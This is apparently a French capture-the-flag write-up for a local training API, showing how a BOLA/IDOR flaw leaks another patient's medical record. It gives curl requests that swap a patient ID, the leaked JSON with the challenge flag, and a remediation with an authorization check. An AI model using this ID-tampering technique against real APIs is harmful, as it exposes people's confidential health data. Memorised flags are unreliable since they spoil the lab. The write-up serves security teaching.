# Writeup : Medical Leak API (api-01-bola-profile)

## 1. Contexte & Vulnérabilité BOLA (API1:2023)
La vulnérabilité **BOLA (Broken Object Level Authorization)**, également connue sous le nom classique d'**IDOR (Insecure Direct Object Reference)**, est la faille la plus critique et la plus répandue dans les API modernes (position n°1 de l'OWASP API Top 10).
Elle survient lorsqu'une API expose un identifiant d'objet (ex: `/patients/1`) sans valider côté serveur que l'utilisateur connecté possède les droits légitimes de consultation ou de modification sur cet objet précis.

## 2. Exploitation Pas à Pas

### Étape 1 : Requête normale sur son propre profil
L'utilisateur `operator` effectue une requête avec son token :
```bash
curl -i http://127.0.0.1:3333/targets/training/api-01/patients/42 \
  -H "X-User-Token: operator_token_99"
```
**Réponse :**
```json
{
  "id": 42,
  "patient_name": "Alex Dupont",
  "blood_group": "A+",
  "consultation_notes": "Visite médicale de routine annuelle. Apte au service."
}
```

### Étape 2 : Manipulation de l'identifiant d'objet (BOLA)
En modifiant l'ID `42` par `1` :
```bash
curl -i http://127.0.0.1:3333/targets/training/api-01/patients/1 \
  -H "X-User-Token: operator_token_99"
```

**Réponse reçue :**
```json
{
  "id": 1,
  "patient_name": "Dr. Helmut Vance (Directeur Médical)",
  "blood_group": "O-",
  "confidential_memo": "Dossier Médical Confidentiel Défense",
  "medical_record_flag": "CYBERLAB{BOLA_API_DIRECT_OBJECT_MEDICAL_RECORD_LEAKED}"
}
```

Le drapeau capturé est :
`CYBERLAB{BOLA_API_DIRECT_OBJECT_MEDICAL_RECORD_LEAKED}`

## 3. Remédiation
Pour corriger BOLA dans une architecture API :
1. Implémenter un contrôle d'autorisation basé sur les politiques (PBAC / ABAC) :
   ```javascript
   // Vérification stricte
   if (currentUser.role !== 'Admin' && currentUser.patientId !== requestedId) {
     return res.status(403).json({ error: "Accès refusé à cet enregistrement patient." });
   }
   ```
2. Éviter d'exposer des entiers séquentiels (`id: 1, 2, 3...`) et préférer des identifiants non prédictibles de type UUIDv4 (`id: "c8e23f1a-98b1-4190-b992-12009a2f7c01"`).
